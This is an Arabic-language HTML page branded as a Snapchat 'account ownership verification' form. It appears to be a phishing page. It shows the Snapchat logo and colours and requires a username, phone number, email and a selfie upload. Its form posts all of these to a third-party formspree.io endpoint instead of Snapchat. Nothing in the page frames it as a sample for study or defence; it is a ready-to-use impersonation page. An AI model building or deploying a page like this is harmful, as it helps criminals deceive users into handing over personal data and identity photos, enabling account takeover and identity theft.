
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>إثبات ملكية الحساب - SnapchatKSA</title>
<style>
body {
    font-family: Arial, sans-serif;
    background: url('https://images.unsplash.com/photo-1610273845400-1c5f35c91a1e?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=MnwxMTc3M3wwfDF8c2VlfHx8fHx8fHwxNjg3NjE3MzU1&ixlib=rb-4.0.3&q=80&w=1080') no-repeat center center fixed;
    background-size: cover;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}
form {
    background: rgba(255, 255, 255, 0.95);
    padding: 35px;
    border-radius: 20px;
    box-shadow: 0 0 30px rgba(0,0,0,0.3);
    width: 360px;
    position: relative;
}
form::before {
    content: '';
    background-image: url('https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/320px-Snapchat_logo.svg.png');
    background-size: 60px 60px;
    background-repeat: no-repeat;
    position: absolute;
    top: -40px;
    left: calc(50% - 30px);
    width: 60px;
    height: 60px;
}
h2 {
    text-align: center;
    color: #fffc00;
    font-weight: bold;
    margin-top: 40px;
    text-shadow: 1px 1px 2px #333;
}
label {
    font-weight: bold;
    display: block;
    margin-top: 15px;
    color: #333;
}
.input-group {
    position: relative;
}
.input-group img {
    position: absolute;
    top: 10px;
    left: 10px;
    width: 20px;
    opacity: 0.7;
}
input, input[type=file] {
    width: 100%;
    padding: 10px 10px 10px 35px;
    margin-top: 5px;
    border-radius: 8px;
    border: 1px solid #ccc;
    font-size: 14px;
}
button {
    width: 100%;
    padding: 12px;
    border: none;
    border-radius: 8px;
    background: #fffc00;
    color: #000;
    font-size: 16px;
    cursor: pointer;
    margin-top: 20px;
    font-weight: bold;
    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
    transition: all 0.2s ease-in-out;
}
button:hover {
    background: #ffe500;
    transform: translateY(-2px);
}
</style>
</head>
<body>
<form action="https://formspree.io/f/mnqwjzaj" method="POST" enctype="multipart/form-data">
<h2>إثبات أن الحساب يعود لصاحب الحساب ولا يوجد أي انتحال للشخصية</h2>

<label>اسم المستخدم</label>
<div class="input-group">
<img src="https://img.icons8.com/ios-glyphs/30/000000/user.png"/>
<input type="text" name="username" placeholder="أدخل اسم المستخدم" required>
</div>

<label>رقم الهاتف</label>
<div class="input-group">
<img src="https://img.icons8.com/ios-glyphs/30/000000/phone.png"/>
<input type="tel" name="phone" placeholder="أدخل رقم الهاتف" required>
</div>

<label>البريد الإلكتروني</label>
<div class="input-group">
<img src="https://img.icons8.com/ios-glyphs/30/000000/email.png"/>
<input type="email" name="email" placeholder="أدخل البريد الإلكتروني" required>
</div>

<label>تحميل صورة سيلفي للتحقق</label>
<div class="input-group">
<img src="https://img.icons8.com/ios-glyphs/30/000000/camera.png"/>
<input type="file" name="selfie" accept="image/*" required>
</div>

<button type="submit">إرسال</button>
</form>
</body>
</html>
